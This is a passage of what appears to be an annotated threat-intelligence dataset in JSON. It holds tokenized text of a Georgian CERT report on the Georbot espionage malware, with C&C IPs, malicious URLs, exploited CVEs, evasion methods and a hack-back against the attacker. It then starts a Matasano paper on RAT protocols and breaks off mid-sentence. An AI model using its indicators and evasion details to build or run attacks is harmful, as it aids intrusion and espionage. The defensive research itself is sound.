"."], ["Searches", "for", "the", "\u201c", "Sensitive", "words", "\u201d", "into", "the", "Document", "Files", "."], ["5", "."], ["Makes", "Video", "and", "Audio", "Capture", "using", "built", "-", "in", "camera", "and", "microphone", "."], ["3|P", "ag", "e", "Targeted", "Audience"], ["Cyber", "Attack", "was", "designed", "very", "smartly", "."], ["Various", "Georgian", "News", "-", "Related", "web", "-", "sites", "were", "hacked", "and", "modified", "only", "Specific", "News", "pages", "(", "eg", "."], ["NATO", "delegation", "Visit", "in", "Georgia", ",", "USGeorgian", "Agreements", "and", "Meetings", ",", "Georgian", "Military", "NEWS", ")", "."], ["Only", "the", "persons", "who", "was", "interested", "in", "such", "information", "were", "infected", "with", "this", "Advanced", "Threat", ",", "despite", "of", "Security", "Defensive", "measure", "\u2019s", "and", "Software", "used", "on", "targets", "Computer", "and", "Network", "Systems", "."], ["Threat", "was", "highly", "encrypted", "and", "used", "contemporary", "stealthy", "techniques", ",", "so", "that", "none", "of", "security", "tools", "could", "identify", "it", "."], ["www.caucasustimes.com"], ["\u2013", "Site", "about", "NEWS", "from", "Caucasian", "Region", "www.cei.ge"], ["\u2013", "Caucasus", "Energy", "and", "Infrastructure", "www.psnews.ge", "-", "Georgian", "NEWS", "Site", "ema.gov.ge", "www.opentext.ge", "www.presa.ge", "www.presage.tv", "www.psnews.info"], ["www.resonancedaily.com"], ["4|P", "ag", "e", "Malware", "Capabilities", "Fully", "Controls", "infected", "computer", "."], ["Malicious", "file", "was", "searching", "for", "Sensitive", "WORDS", "inside", "MS", "Office", "and", "PDF", "documents", "."], ["\uf0b7", "Send", "any", "file", "from", "the", "local", "hard", "drive", "to", "the", "remote", "server", "\u2022", "Steal", "certificates"], ["\u2022"], ["Search", "the", "hard", "drive", "for", "Microsoft", "Word", "documents", "(", "sensitive", "words", ")"], ["\u2022"], ["Search", "the", "hard", "drive", "for", "remote", "desktop", "configuration", "files", ",", "pbk", "files", "\u2022"], ["Take", "screenshots", "\u2022", "Record", "audio", "using", "the", "microphone"], ["\u2022", "Record", "video", "using", "the", "webcam"], ["\u2022"], ["Scan", "the", "local", "network", "to", "identify", "other", "hosts", "on", "the", "same", "network"], ["\u2022", "Execute", "arbitrary", "commands", "on", "the", "infected", "system", "5|P", "ag", "e", "Sensitive", "Words"], ["In", "The", "Final", "Steps", "Cyber", "Attacker", "Steals", "Matched", "files", ",", "uploads", "them", "to", "the", "Server", "."], ["6|P", "ag", "e", "Command", "&", "Controll", "Servers", "September", ",", "2010", "\u2013", "georgiaonline.xp3.biz", "(", "United", "States", ")", "FreeWebHostingArea.com", "March", ",", "2011", "\u2013", "ema.gov.ge", "(", "Georgia", ")", "(", "hacked", "webserver", ")", "April", ",", "2011", "-", "178.32.91.70", "(", "France", ")"], ["OVH"], ["Hosting", "June", ",", "2011", "-", "88.198.240.123", "/", "88.198.238.55", "(", "Germany", ")", "DME"], ["Hosting", "October", ",", "2011", "-", "94.199.48.104", "(", "Hungary", ")", "Net23.hu", "November", ".", "2011", "-", "173.212.192.83", "(", "United", "States", ")", "December", ",", "2011", "-", "31.31.75.63", "(", "Czech", "Republic", ")", "January", ",", "2012", "-", "31.214.140.214", "(", "Germany", ")", "March", ",", "2012", "\u2013", "78.46.145.24", "(", "Germany", ")", "DME", "Hosting", "DME"], ["Hosting", "This", "server", "changes", "destination", "country", "and", "IP", "address", "upon", "detection", "."], ["7|P", "ag"], ["e", "There", "were", "390", "Infected", "Computers", ":", "70", "%", "of", "them", "from", "Georgia", "5", "%", "from", "the", "United", "States", "4", "%", "-", "Canada", ",", "Ukraine", ",", "France", ",", "China", "3", "%", "-", "Germany", "3", "%", "-", "Russia", "Example", "of", "infected", "Computer", "from", "United", "States", "8|P", "ag", "e", "Malicious", "file", "was", "evolving", "and", "Developed", "time", "to", "time", ":", "30", "March", ",", "2011", "\u2013", "Virus", "Steals", "Sensitive", "Documents", ",", "Certificates", "14", "September", "2011", "\u2013", "Changed", "Infection", "Mechanism", ",", "new", "Bypassing", "methods", "for", "the", "(", "Antivirus", "/", "Firewall", "/", "IDS", ")", "25", "November", "2011", "\u2013", "Virus", "is", "more", "encrypted", "and", "obfuscated", "."], ["infects", "windows", "7", "Operating", "System", "12", "December", "2011", "\u2013", "added", "Video", "Recording", "capability", ",", "scanning", "and", "infecting", "computers", "through", "the", "Network", ",", "changed", "Spreading", "vector"], ["It", "had", "been", "evolved", "from", "2.1", "version", "to", "5.5", "."], ["9|P", "ag", "e", "INFECTING", "MECHANISM", "1", ")", "2", ")"], ["3", ")"], ["4", ")", "5", ")", "Injected", "script", "or", "iframe", "into", "Legitimate", "Web", "-", "site", "Frame.php", "from", "iframe", "\u2013", "contained", "(", "exploit", "pack", ")"], ["Drive", "-", "By", "Download", "&", "Execution", "of", "calc.exe", "Calc.exe", "self", "-", "destruction", "injecting", "code", "into", "Explorer.exe"], ["Creating", "persistant", "usbserv.exe", "virus", "Step", "1-", "injected", "script", "10", "|", "P", "a", "g", "e", "shellcode", "inside", "frame.php", "11", "|", "P", "a", "g", "e", "/", "exploit", "pack", "files", "1", ")"], ["We", "found", "out", "that", "there", "is", "crafted", "and", "obfuscated", "frame.php", "file", ",", "which", "carries", "some", "exploit", "code", "and", "redirects", "users", "to", "other", "exploit", "pages", ":"], ["It", "uses", "CVE-2010", "-", "0842", ",", "CVE-2006", "-", "3730", ",", "MS06", "-", "057", "and", "other", "unknown", "vulnerabilities", "."], ["2", ")", "Exploit", "code", "used", "in", "frame.php", "is", "crypted", "version", "of", "TrojanDownloader", ":", "JS", "/", "SetSlice", ",", "which", "exploits", "MS06", "-", "057", "Vulnerability", "by", "using", "'", "WebViewFolderIcon", "'", "ActiveX", "control", "(", "Web", "View", ")", "."], ["3", ")"], ["Also", "there", "was", "some", "0day", "exploit", "used", "for", "exploitation", "through", "PDF", ",", "JAR", "files", "."], ["Malicious", "Files", "Not", "detected", "with", "Major", "Antivirus", "Products", "(", "1/47", "Virustoal", ",", "Dr.", "Web", "result", "\u2013", "suspicious", ")"], ["Bypasses", "Windows", "7", "sp1", "patched", "with", "Firewall", "enabled", "."], ["As", "of", "25.03.2011", ",", "20.06.2011", ",", "16.01.2012", ",", "25.03.2012", "After", "Executing", "Malware", "does", "3", "major", "things", ":", "-", "Before", "installing", "bot", "checks", "if", "the", "computer", "is", "located", "in", "UTC+3", ",", "UTC+4", "Time", "-", "zone", ":", "-", "injects", "itself", "into", "iexplorer.exe", "and", "communicating", "to", "defaced", "sites", ",", "for", "C&C", "address", "retrival", "-", "creating", "usbserv.exe", "bot", "file", "in", "Application", "Data", "directory", ",", "and", "writing", "it", "to", "autorun", "in", "Windows"], ["Registry", "."], ["12", "|", "P", "a", "g", "e", "Bot", "Control", "Mechanism", "1", ")"], ["C&C", "servers", "Addresses", "are", "written", "into", "Malware", "\u2019s", "Binary", "file", "2", ")"], ["If", "all", "of", "them", "are", "unreachable", "malware", "reads", "special", "html", "page", "header", ",", "which", "actually", "is", "html", "page", "defaced", "on", ",", "one", "of", "the", "Georgian", "Governmental", "Web", "-", "Site", ":", "13", "|", "P", "a", "g", "e", "NEW", "METHOD", "OF", "MALWARE", "UPDATING"], ["New", "version", "of", "Malware", "file", "is", "downloaded", "as", "base64", "encoded", "plain", "text", "from", "different", "servers", "simultaneously", "and", "then", "assembled", "into", "one", "file", "."], ["14", "|", "P", "a", "g", "e", "Unique", "Characteristics", "1", ")"], ["Searching", "Sensitive", "word", "\u2019s", "In", "filenames", "and", "INTO", "pdf", ",", "word", ",", "xls", ",", "txt", ",", "rtf", ",", "ppt", "Documents", "."], ["2", ")"], ["Recording", "Videos", "from", "Webcam", ":", "During", "skype", "conversation", ",", "live", "streaming", "capability", "3", ")"], ["Modify", "malware", "code", "file", "from", "C&C", "Web", "Panel", "4", ")", "Self", "-", "Created", "Packer", ",", "Crypter", "in", "Assembler", "Language", "(", "evading", "A", "/", "V", ")", "5", ")", "Update", "mechanism", ",", "Base", "-", "encoded", "plaintext", ",", "simultaneously", "from", "different", "C&C", "servers", "."], ["(", "evading", "IPS", "/", "IDS", ")"], ["6", ")", "opening", "network", "socket", "at", "ring0", "level", "(", "evading", "firewall", ")", "/", "TDSS", "Rootkit", "Modification", "15", "|", "P", "a", "g", "e", "Infected", "Organisations", "Most", "Georgian", "Infected", "computers", "were", "from", "our", "Governmental", "Agencies", "and", "Critical", "Information", "Infrastructures", "Targets", ":", "1", ")", "Ministries", "2", ")", "Parliament", "3", ")", "Critical", "Information", "Ifrastructures"], ["4", ")", "Banks", "5", ")", "NGO", "\u2019s", "16", "|", "P", "a", "g", "e", "Responding", "Steps", "1", ")", "Blocked", "each", "of", "6", "C&C", "IP", "addresses", ",", "upon", "detection", ",", "through", "Country", "\u2019s", "3", "main", "Internet", "Service", "Providers", "."], ["(", "Immediate", "Response", ")"], ["2", ")", "CERT", "-", "GOV", "-", "GE", "identified", "all", "Georgian", "infected", "IP", "\u2019s", "and", "gave", "mitigation", "strategies", "and", "cleaning", "tools", "to", "Infected", "Agencies", "and", "Institutions", "."], ["3", ")", "Cooperated", "with", "Antivirus", ",", "IDS", "/", "IPS", "solutions", ",", "to", "create", "mitigating", "tools", "and", "signatures", "."], ["(", "Microsoft", ",", "Eset", ",", "Snort", ",", "Cisco", ",", "various", "Blacklists", ",", "Blocklists", ")", "4", ")", "Cooperated", "with", "FBI", ",", "Department", "of", "Homeland", "Security", ",", "US", "Secret", "Service", ",", "USCERT", ",", "Governmental", "-", "CERT", "-", "Germany", ",", "CERT", "-", "Ukraine", ",", "CERT", "-", "Polska", ",", "Microsoft", "Cybersecurity", "Division", "5", ")"], ["Hosting", "Providers", "Abuse", "Teams", ",", "to", "shut", "down", "attacking", "servers", "."], ["6", ")", "Law", "Enforcement", "Agencies", "to", "obtain", "log", "files", "and", "system", "images", "for", "Forensic", "Analysis", "."], ["17", "|", "P", "a", "g", "e", "Counter", "Cyber", "-", "Intelligence"], ["(", "unmasking", "the", "attackers", ")", "CERT", "-", "GOV", "-", "GE", "gained", "full", "access", "to", "Command", "and", "Control", "servers", ",", "Decrypted", "communication", "mechanisms", "and", "malicious", "files", "."], ["After", "Analyzing", "all", "the", "gathered", "information", "we", "have", "identified", "Cyber", "attacker", "persons", "and", "organizations", "."], ["\u201c", "During", "2008", "Cyber", "War", "between", "Russia", "and", "Georgia", ",", "two", "Independent", "US", "-", "based", "Organizations", "linked", "Cyber", "Attackers", "with", "Russian", "Official", "Ministries", "and", "Organizations", "."], ["\u201c", "United", "States", "Cyber", "Consequences", "Unit", "\u201d", "and", "\u201c", "Project", "Grey", "Goose", "\u201d"], ["Jefrey", "Carr", ",", "GreyLogic", "(", "cyber", "Intelligence", "services", "for", "Government", "Sector", ")"], ["Sanjay", "Goel", ",", "New", "York", "State", "Center", "for", "Information", "Forensics", "and", "Assurance"], ["Mike", "Himley", ",", "CEO", "/", "President", "of", "Eagle", "Intelligence"], ["They", "investigated", "entire", "Cyber", "Attack", "against", "Georgia", "and", "linked", "2008", "Cyber", "Attacks", "with", "so", "-", "called", "Cyber", "-", "Criminals", "Group", "\u201c", "Russian", "Business", "Network", "\u201d", ","], ["They", "had", "reported", ",", "that", "Some", "of", "used", "Internet", "Resources", "and", "Credentials", "belonged", "with", "\u201c", "Russian", "Ministry", "of", "Defense", "Research", "Institute", "\u201d", "called", "\u2013", "Center", "for", "Research", "of", "Military", "Strength", "of", "Foreign", "Countries", ".", "\u201d"], ["In", "2011", "-", "2012", ",", "During", "This", "New", "Cyber", "Espionage", "Attack", ",", "we", "have", "identified", "Russian", "Security", "agencies", ",", "once", "again", "."], ["18", "|", "P", "a", "g", "e", "We", "have", "found", ":", "3", "main", "facts", ",", "which", "indicate", "to", "Russian", "Official", "State", "organizations", "."], ["Warynews.ru", "\u2013", "site", "used", "to", "control", "infected", "Georgian", "computers", "\u2013", "IP", "and", "DNS", "servers", "belonges", "to", "Russian", "Business", "Network", "."], ["(", "mentioned", "in", "various", "Blacklist", ",", "Bad", "Reputation", ")", "www.rbc.ru", "\u2013", "written", "directly", "into", "MALWARE", "code", ",", "to", "communicate", "with", "Attackers", "if", "every", "communication", "channel", "is", "closed", "."], ["Official", "name", "\u201c", "Russian", "Business", "Consalting", "\u201d", "\u2013", "official", "website", ",", "linked", "with", "RBN", "."], ["http://legalcrf.in/f/4b178e605583cca28c850943e805aabc/1"], ["http://legalcrf.in/t/19ebfd07a13d3edf82fcc121a0e4643c", "http://legalcrf.in/images/np/4b178e605583cca28c850943e805aabc.pdf", "http://legalcrf.in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf.in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf.in/images/t/4b178e605583cca28c850943e805aabc.html", "http://legalcrf.in/images/np/4b178e605583cca28c850943e805aabc.pdf", "http://legalcrf.in/images/4b178e605583cca28c850943e805aabc.jar", "http://legalcrf.in/f/4b178e605583cca28c850943e805aabc/3", "http://legalcrf.in/f/4b178e605583cca28c850943e805aabc/1", "19", "|", "P", "a", "g", "e", "Legalcrf.in", "\u2013", "Sending", "Malicious", "files", "through", "SPAM", "email", "FROM", "\u201c", "admin@President.gov.ge", "\u201d", "."], ["Hosting", "Exploit", "Files", "Obscure", "Registrator", ",", "Only", "Discoverable", "by", "Indian", "WHOIS", "Service", ",", "20", "|", "P", "a", "g", "e", "Lubianka", "13", ",", "Moscow", ".", "-"], ["Russian", "Ministry", "of", "Internal", "Affairs", ",", "Department", "of", "Logistics", "-", "Organization", "development", "and", "communications", "systems", ",", "improve", "information", "and", "communication", "technologies", "and", "technical", "protection", "of", "information", ";"], ["Next", "to", "it", ":", "Federal", "Security", "Service", "of", "the", "Russian", "Federation", "(", "FSB", ")", "\u2013", "Moscow", "In", "March", "2012", ",", "Company", "ESET", "Security", "Published", "Report", "named", "\u201c", "Georbot", ":", "From", "Russia", "With", "Love", "\u201d", "(", "with", "support", "of", "our", "CERT", "Team", ")"], ["After", "That", "Russian", "NEWS", "Agencies", "Spread", "Disinformation", "Based", "on", "ESET", "\u2019s"], ["Report", "Blaming"], ["Georgian", "Governmental", "website", "(", "which", "actionly", "was", "hacked", ")", "for", "serving", "malicious", "files", "."], ["But", "there", "where", "nothing", "said", "about", "REAL", "6", "Command", "&", "Controll", "Servers", "which", "were", "hosted", "in", "various", "countries", "and", "mentioned", "in", "ESET", "\u2019s", "Report", "."], ["21", "|", "P", "a", "g", "e"], ["We", "have", "Infected", "our", "PC", "from", "Lab", ",", "then", "gave", "Cyber", "Attacker", "Fake", "ZIP", "Archive", "with", "his", "own", "virus", "inside", "and", "the", "name", "\u201c", "Georgian", "-", "Nato", "Agreement", "\u201d", "."], ["Attacker", "Stole", "that", "archive", "and", "executed", "malicious", "files", "."], ["As", "we", "had", "access", "to", "BOT", "Panel", ",", "we", "had", "maintained", "control", "over", "his", "PC", "."], ["Then", "captured", "got", "video", "of", "him", ",", "personally", "."], ["We", "have", "captured", "process", "of", "creating", "new", "malicious", "modules", "."], ["We", "have", "Obtained", "Russian", "Document", ",", "from", "email", ",", "where", "he", "was", "giving", "someone", "instructions", "how", "to", "use", "this", "malicious", "software", "and", "how", "to", "infect", "targets", "."], ["We", "have", "linked", "him", "with", "some", "of", "German", "and", "Russian", "hackers", "."], ["Then", "we", "have", "Obtained", "information", "about", "his", "destination", "City", ",", "Internet", "Service", "Provider", ",", "Email", "and", "etc", ".", "22", "|", "P", "a", "g", "e", "23", "|", "P", "a", "g", "e", "Disassembly", "Process", "in", "OllyDbg", "."], ["24", "|", "P", "a", "g", "e", "Nickname", ":", "ESHKINKOT", "\u2013", "Inside", "Malware", "Executable"], ["Same", "MAIL", "Address", ",", "City", "in", "Russia", "25", "|", "P", "a", "g", "e", "On", "Russian", "Xakep", "Forum", ",", "Seeking", "help", "for", "Exploit", "Development"], ["His", "Internet", "Service", "Provide", ",", "City", "26", "|", "P", "a", "g", "e", "Information", "About", "This", "Incident", "was", "Presented", "at", "Various", "Events", "&", "Conferences", "."], ["1", ")", "SSECI", "2012", "(", "Safety", ",", "Security", "and", "Efficiency", "of", "Critical", "Infrastructures", ")", "\u2013"], ["Prague", ",", "Czech", "Republic", "30", "may", "\u2013", "01", "June", "2012", "(", "with", "support", "of", "ONRG", "\u2013", "Office", "of", "Naval", "Research", "Global", ")", "2", ")", "Symposium", "on", "Cyber", "Incidents", "and", "Critical", "Infrastructure", "Protection", "\u2013"], ["Tallin", ",", "Estonia", "18", "-", "19", "June", "2012", "3", ")", "NATO", "\u2013", "Science", "for", "Peace", "and", "Security", "(", "SPS", ")", "-"], ["METU", "-", "Middle", "East", "Technical", "University"], ["Georgian", "Cyber", "Cases", "for", "Afghan", "IT", "Specialists", "Ankara", ",", "Turkey", "21", "May", "-", "01", "Jun", "2012", "27", "|", "P", "a", "g", "e"]]}, {"vertexSet": [[{"name": "Remote Administration Tools", "pos": [3, 6], "sent_id": 4, "type": "Malware"}], [{"name": "RATs", "pos": [5, 6], "sent_id": 19, "type": "Malware"}], [{"name": "keylogging", "pos": [12, 13], "sent_id": 19, "type": "Exploit"}], [{"name": "screen and camera capture", "pos": [14, 18], "sent_id": 19, "type": "Exploit"}], [{"name": "file management", "pos": [19, 21], "sent_id": 19, "type": "Exploit"}], [{"name": "code and script execution", "pos": [22, 26], "sent_id": 19, "type": "Exploit"}], [{"name": "power control", "pos": [27, 29], "sent_id": 19, "type": "Exploit"}], [{"name": "registry management", "pos": [30, 32], "sent_id": 19, "type": "Exploit"}], [{"name": "password sniffing", "pos": [34, 36], "sent_id": 19, "type": "Exploit"}], [{"name": "DarkComet", "pos": [10, 11], "sent_id": 21, "type": "Malware"}], [{"name": "Bandook", "pos": [12, 13], "sent_id": 21, "type": "Malware"}], [{"name": "CyberGate", "pos": [14, 15], "sent_id": 21, "type": "Malware"}], [{"name": "Xtreme RAT", "pos": [16, 18], "sent_id": 21, "type": "Malware"}], [{"name": "Delphi", "pos": [16, 17], "sent_id": 22, "type": "SourceCodeInformation"}], [{"name": "RAT", "pos": [1, 2], "sent_id": 26, "type": "Malware"}], [{"name": "reverse-connecting", "pos": [5, 8], "sent_id": 27, "type": "MalwareCharacteristics"}], [{"name": "DarkComet", "pos": [3, 4], "sent_id": 36, "type": "Malware"}], [{"name": "|", "pos": [18, 19], "sent_id": 39, "type": "Indicator"}], [{"name": "SQL Injection", "pos": [30, 32], "sent_id": 49, "type": "Exploit"}], [{"name": "DarkComet", "pos": [33, 34], "sent_id": 49, "type": "Malware"}], [{"name": "QuickUp", "pos": [20, 21], "sent_id": 57, "type": "Exploit"}], [{"name": "Bandook", "pos": [23, 24], "sent_id": 90, "type": "Malware"}], [{"name": "C++", "pos": [30, 31], "sent_id": 90, "type": "MalwareCharacteristics"}], [{"name": "Delphi", "pos": [32, 33], "sent_id": 90, "type": "MalwareCharacteristics"}], [{"name": "process injection", "pos": [6, 8], "sent_id": 91, "type": "MalwareCharacteristics"}], [{"name": "API unhooking", "pos": [9, 11], "sent_id": 91, "type": "MalwareCharacteristics"}], [{"name": "kernel patching", "pos": [13, 15], "sent_id": 91, "type": "MalwareCharacteristics"}], [{"name": "XORing against the constant 0xE9", "pos": [7, 12], "sent_id": 96, "type": "Obfuscation"}], [{"name": "&&&", "pos": [7, 10], "sent_id": 97, "type": "Indicator"}], [{"name": "TightVNC 1.2.9.0", "pos": [5, 7], "sent_id": 98, "type": "Software"}], [{"name": "Bandook", "pos": [5, 6], "sent_id": 101, "type": "Malware"}], [{"name": "CyberGate", "pos": [1, 2], "sent_id": 115, "type": "Malware"}], [{"name": "Delphi", "pos": [9, 10], "sent_id": 115, "type": "MalwareCharacteristics"}], [{"name": "LordPE", "pos": [1, 2], "sent_id": 117, "type": "Software"}], [{"name": "PEiD", "pos": [1, 2], "sent_id": 119, "type": "Software"}], [{"name": "Detect It Easy", "pos": [3, 6], "sent_id": 119, "type": "Software"}], [{"name": "ProtectionID", "pos": [13, 14], "sent_id": 120, "type": "Software"}], [{"name": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567 89+/", "pos": [15, 17], "sent_id": 127, "type": "Obfuscation"}], [{"name": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx yz+/", "pos": [23, 25], "sent_id": 127, "type": "Obfuscation"}], [{"name": "###@@@", "pos": [9, 13], "sent_id": 129, "type": "Indicator"}], [{"name": "njgnjvejvorenwtrnionrionvironvrnvcg210public", "pos": [0, 1], "sent_id": 131, "type": "Indicator"}], [{"name": "CyberGate", "pos": [0, 1], "sent_id": 138, "type": "Malware"}], [{"name": "Xtreme RAT", "pos": [0, 2], "sent_id": 144, "type": "Malware"}], [{"name": "user.info", "pos": [8, 9], "sent_id": 155, "type": "File"}], [{"name": "a933d13f81649bebe035dc21f4002ff1", "pos": [16, 17], "sent_id": 158, "type": "MD5"}], [{"name": "202cb962ac59075b964b07152d234b70", "pos": [20, 21], "sent_id": 159, "type": "MD5"}], [{"name": "\\x58\\x0d\\x0a", "pos": [11, 12], "sent_id": 202, "type": "Indicator"}], [{"name": "Xtreme RAT", "pos": [0, 2], "sent_id": 204, "type": "Malware"}]], "labels": [{"r": "P13", "h": 14, "t": 15, "evidence": [26, 27]}, {"r": "P21", "h": 17, "t": 16, "evidence": [36, 39]}, {"r": "P13", "h": 21, "t": 22, "evidence": [90]}, {"r": "P13", "h": 21, "t": 23, "evidence": [90]}, {"r": "P13", "h": 21, "t": 24, "evidence": [90, 91]}, {"r": "P13", "h": 21, "t": 25, "evidence": [90, 91]}, {"r": "P13", "h": 21, "t": 26, "evidence": [90, 91]}, {"r": "P21", "h": 28, "t": 30, "evidence": [97, 101]}, {"r": "P13", "h": 31, "t": 32, "evidence": [115]}, {"r": "P21", "h": 39, "t": 41, "evidence": [129, 138]}, {"r": "P21", "h": 40, "t": 41, "evidence": [131, 138]}, {"r": "P21", "h": 43, "t": 42, "evidence": [144, 155]}, {"r": "P21", "h": 46, "t": 47, "evidence": [202, 204]}], "title": "201210MatasanoRAT", "sents": [["RESEARCH", "pest", "control", ":", "taming", "the", "rats", "Authors", "Shawn", "Denbow"], ["Twitter", ":", "@sdenbow", "_"], ["Email", ":", "denbos@rpi.edu"], ["Jesse", "Hertz"], ["Twitter", ":", "@hectohertz", "Remote", "Administration", "Tools", "(", "RATs", ")", "allow", "a", "remote", "attacker", "to", "control", "and", "access", "the", "system", "."], ["In", "this", "paper", ",", "we", "present", "our", "analysis", "of", "their", "protocols", ",", "explain", "how", "to", "decrypt", "their", "traffic", ",", "as", "well", "as", "present", "vulnerabilities", "we", "have", "found", "."], ["Email", ":"], ["jhertz@brown.edu"], ["Introduction"], ["As", "2012", "Matasano", "summer", "interns", ",", "we", "were", "tasked", "with", "running", "a", "research", "project", "with", "a", "couple", "criteria", ":", "\u2022"], ["It", "should", "be", "something", "we", "are", "both", "interested", "in", "."], ["\u2022", "We", "should", "be", "able", "to", "present", "our", "research", "for", "the", "company", "at", "the", "end", "of", "our", "internship", "."], ["However", ",", "on", "completion", ",", "we", "decided", "that", "it", "would", "be", "best", "if", "we", "made", "our", "findings", "public", "."], ["With", "John", "Villamil", ",", "our", "advisor", ",", "we", "decided", "that", "given", "our", "interest", "in", "low", "-", "level", "analysis", ",", "we", "should", "analyze", "Remote", "Administration", "Tools", "(", "RATs", ")", "."], ["RATs", "have", "recent", "seen", "media", "attention", "RATs", "due", "to", "their", "use", "by", "oppressive", "governments", "in", "spying", "on", "activists", "and", "other", "\u201c", "dissidents", "\u201d", "."], ["We", "felt", "this", "to", "be", "a", "perfect", "project", "."], ["Remote", "Administration", "Tools", "are", "pieces", "of", "software", "which", ",", "once", "installed", "on", "a", "victim", "\u2019s", "computer", "allow", "a", "remote", "user", "to", "control", "and", "access", "the", "system", "."], ["RATs", "can", "be", "used", "legitimately", "by", "system", "administrators", ",", "or", "they", "can", "be", "used", "maliciously", "."], ["There", "are", "a", "variety", "of", "methods", "by", "which", "they", "are", "installed", "on", "a", "computer", ":", "Various", "social", "engineering", "tactics", "can", "be", "employed", "to", "get", "a", "user", "to", "open", "the", "executable", ",", "they", "can", "be", "bundled", "with", "other", "pieces", "of", "software", ",", "they", "can", "be", "installed", "as", "the", "payload", "of", "a", "virus", "or", "worm", ",", "or", "they", "can", "be", "installed", "after", "an", "attacker", "gains", "access", "to", "a", "system", "through", "an", "exploit", "."], ["Most", "of", "the", "commonly", "available", "RATs", "are", "at", "least", "able", "to", "perform", "keylogging", ",", "screen", "and", "camera", "capture", ",", "file", "management", ",", "code", "and", "script", "execution", ",", "power", "control", ",", "registry", "management", ",", "and", "password", "sniffing", "."], ["Wikipedia", "has", "a", "more", "complete", "list", "of", "common", "RAT", "functionality", "[", "1", "]", "."], ["Our", "research", "focused", "on", "analyzing", "several", "publicly", "available", "RATs", ":", "DarkComet", ",", "Bandook", ",", "CyberGate", "and", "Xtreme", "RAT", "."], ["Interestingly", ",", "all", "of", "the", "RATs", "we", "analyzed", "were", "coded", "either", "in", "part", "or", "entirely", "in", "Delphi", "."], ["They", "all", "featured", "a", "reverse", "connecting", "architecture", ",", "as", "well", "as", "some", "form", "of", "cryptography", "or", "obfuscation", "of", "their", "communications", "."], ["In", "this", "paper", ",", "we", "present", "our", "analysis", "of", "their", "protocols", ",", "explain", "how", "to", "decrypt", "their", "traffic", ",", "as", "well", "as", "present", "vulnerabilities", "we", "have", "found", "."], ["The", "appendices", "to", "this", "paper", "contain", "MITM", "tools", "for", "decrypting", "traffic", ",", "as", "well", "as", "proof", "of", "concept", "exploits", "for", "the", "vulnerabilities", "we", "\u2019ve", "found", "."], ["Basic", "RAT", "Architecture"], ["Most", "RATs", "employ", "a", "\u201c", "reverse", "-", "connecting", "\u201d", "architecture", "."], ["The", "\u201c", "client", "\u201d", "program", ",", "resides", "on", "the", "attacker", "\u2019s", "machine", "and", "is", "used", "to", "control", "a", "compromised", "system", "."], ["If", "often", "features", "a", "full", "UI", "designed", "for", "ease", "of", "use", "."], ["In", "contrast", ",", "the", "\u201c", "server", "\u201d", "program", "is", "a", "much", "smaller", "stub", "which", "is", "installed", "on", "the", "compromised", "computer", "."], ["These", "servers", "feature", "no", "UI", ",", "and", "take", "measures", "to", "disguise", "their", "presence", "."], ["On", "execution", ",", "the", "sever", "initiates", "a", "connection", "back", "to", "the", "client", "computer", ",", "and", "remote", "control", "is", "then", "possible", "."], ["The", "client", "program", "typically", "has", "the", "ability", "to", "generate", "server", "stubs", ",", "which", "have", "the", "IP", "address", "of", "the", "client", "(", "the", "command", "and", "control", "center", ")", "hard", "coded", "into", "them", "."], ["Some", "free", "versions", "of", "the", "RATs", "we", "investigated", "were", "feature", "limited", "to", "producing", "server", "stubs", "that", "were", "not", "stealthy", "or", "could", "only", "connect", "to", "localhost", ",", "with", "the", "ability", "to", "generate", "\u201c", "full", "\u201d", "stubs", "only", "available", "on", "purchasing", "the", "paid", "version", "."], ["Some", "servers", "had", "measures", "to", "defeat", "or", "disable", "antivirus", "and", "firewall", "software", "on", "the", "compromised", "machine", "."], ["The", "DarkComet", "RAT", "DarkComet", "is", "one", "of", "the", "most", "popular", "RATs", "in", "use", "today", ",", "gaining", "recent", "notoriety", "after", "its", "use", "by", "the", "Syrian", "government", "[", "13", "]", "."], ["The", "encryption", "method", "used", "in", "DarkComet", "has", "already", "been", "extensively", "analyzed", "by", "various", "researchers", "[", "2", "]", "[", "3", "]", ",", "so", "we", "will", "not", "reiterate", "here", "."], ["We", "reverse", "engineered", "the", "DarkComet", "protocol", "and", "analyzed", "it", "for", "vulnerabilities", "."], ["After", "a", "quick", "look", "at", "its", "protocol", ",", "it", "is", "easy", "to", "see", "that", "it", "uses", "a", "\u201c", "|", "\u201d", "as", "it", "\u2019s", "delimiter", "between", "string", "parameters", "."], ["Although", ",", "there", "is", "no", "delimiter", "between", "the", "command", "and", "the", "first", "parameter", "."], ["The", "DarkComet", "client", "stores", "information", "about", "servers", "in", "a", "SQLite", "database", ",", "which", "is", "kept", "in", "the", "directory", "from", "which", "the", "client", "runs", "."], ["This", "database", "also", "holds", "usernames", "and", "passwords", "for", "FTP", "servers", "to", "which", "the", "client", "has", "been", "configured", "to", "connect", "."], ["When", "a", "new", "connection", "is", "established", ",", "a", "handshake", "occurs", "which", "looks", "like", "this", ":", "Notation", "C->S", "indicates", "a", "message", "from", "the", "Client", "to", "the", "Server", "S->C", "indicates", "a", "message", "from", "the", "Server", "to", "the", "Client"], ["(", "U", ")", "indicates", "the", "message", "is", "unencrypted", "DarkComet", "Handshake"], ["C->S", ":", "IDTYPE", "S->C", ":"], ["SERVER", "C->S", ":", "GetSIN172.16.1.1|769734", "S->C", ":", "infoesGuest16|172.16.1.1", "/", "[", "172.16.1.128", "]", ":", "1604|USER-3AA4AD4D2", "/", "Administrator|769734|0s|Windows", "XP", "Service", "Pack", "3", "[", "2600", "]", "32", "bit", "(", "C:\\", ")", "|x||", "US||{HW", "-", "ID}|43%|English", "(", "United", "States", ")", "US", "/", "5.3.0", "\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."], ["--"], ["|6/13/2012", "at", "2:45:59", "PM|", "For", "testing", "purposes", ",", "we", "wrote", "our", "own", "\u201c", "server", "\u201d", "which", "replied", "with", "the", "following", "shorter", "SIN", "(", "Server", "Info", ")", "string", ":", "infoesX|1|S|5|0s|W", "|x||US|I]|{7}|80%|E|6|5", "SQL", "Injection", "in", "DarkComet"], ["By", "attaching", "a", "debugger", "to", "the", "client", ",", "we", "were", "able", "to", "view", "the", "SQL", "strings", "it", "generated", "by", "the", "client", "to", "query", "its", "database", "."], ["Upon", "connection", "with", "the", "above", "SIN", "string", ",", "the", "following", "SQL", "statement", "is", 